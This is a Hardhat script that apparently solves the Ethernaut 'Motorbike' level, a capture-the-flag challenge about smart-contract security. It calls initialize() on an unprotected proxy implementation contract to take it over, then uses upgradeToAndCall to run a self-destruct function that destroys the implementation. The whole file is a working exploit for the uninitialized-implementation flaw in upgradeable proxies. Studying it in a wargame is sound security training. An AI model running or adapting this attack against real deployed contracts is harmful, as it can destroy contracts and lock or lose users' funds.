const { ethers } = require('hardhat');
const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const engineContract = '0xf1ad09619bc5e46591c26ff0b6d62f9d57ba995b';
  const [deployer] = await ethers.getSigners();
  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const engine = await ethers.getContractAt('Engine', engineContract);
  const MotorbikeSolution = await ethers.getContractFactory('MotorbikeSolution', deployer);
  const motorbikeSolution = await MotorbikeSolution.deploy();

  await engine.connect(deployer).initialize({ gasLimit: 300000 });
  const data = MotorbikeSolution.interface.encodeFunctionData('destroy');

  await engine.connect(deployer).upgradeToAndCall(motorbikeSolution.address, data, { gasLimit: 300000 });

  console.log('Engine destroyed');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
